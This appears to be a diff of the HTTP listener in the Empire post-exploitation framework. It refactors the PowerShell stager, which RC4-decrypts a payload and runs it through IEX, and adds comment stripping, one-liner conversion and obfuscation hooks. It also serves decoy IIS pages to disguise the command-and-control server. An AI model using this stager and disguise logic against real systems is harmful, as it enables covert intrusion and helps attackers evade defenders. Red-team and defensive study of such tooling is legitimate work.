@@ -17,7 +17,7 @@ from pydispatch import dispatcher
 from werkzeug.serving import WSGIRequestHandler
 
 from empire.server.common import encryption, helpers, packets
-from empire.server.utils import data_util
+from empire.server.utils import data_util, listener_util
 
 
 class Listener(object):
@@ -57,6 +57,7 @@ class Listener(object):
                 "Description": "Port for the listener.",
                 "Required": True,
                 "Value": "",
+                "SuggestedValues": ["1335", "1336"],
             },
             "Launcher": {
                 "Description": "Launcher string.",
@@ -247,7 +248,7 @@ class Listener(object):
                 )
 
                 # this is the minimized RC4 stager code from rc4.ps1
-                stager += "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
+                stager += listener_util.powershell_rc4()
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(
@@ -294,6 +295,10 @@ class Listener(object):
 
                 # decode everything and kick it over to IEX to kick off execution
                 stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
+
+                # Remove comments and make one line
+                stager = helpers.strip_powershell_comments(stager)
+                stager = data_util.ps_convert_to_oneliner(stager)
 
                 if obfuscate:
                     stager = data_util.obfuscate(
@@ -433,7 +438,12 @@ class Listener(object):
             )
 
     def generate_agent(
-        self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""
+        self,
+        listenerOptions,
+        language=None,
+        obfuscate=False,
+        obfuscationCommand="",
+        version="",
     ):
         """
         Generate the full agent code needed for communications with this listener.
@@ -642,7 +652,6 @@ class Listener(object):
         port = listenerOptions["Port"]["Value"]
         stagingKey = listenerOptions["StagingKey"]["Value"]
 
-        app = Flask(__name__)
         template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
         app = Flask(__name__, template_folder=template_dir)
         self.app = app
@@ -688,7 +697,7 @@ class Listener(object):
             """
             Returns IIS 7.5 405 page for every Flask 405 error.
             """
-            return render_template("method_not_allowed.html"), 405
+            return make_response(self.method_not_allowed_page(), 405)
 
         @app.route("/")
         @app.route("/iisstart.htm")
@@ -696,13 +705,14 @@ class Listener(object):
             """
             Return default server web page if user navigates to index.
             """
-            return render_template("index.html"), 200
+
+            static_dir = self.mainMenu.installPath + "/data/misc/"
+            return make_response(self.index_page(), 200)
 
         @app.route("/<path:request_uri>", methods=["GET"])
         def handle_get(request_uri):
             """
             Handle an agent GET request.
-
             This is used during the first step of the staging process,
             and when the agent requests taskings.
             """
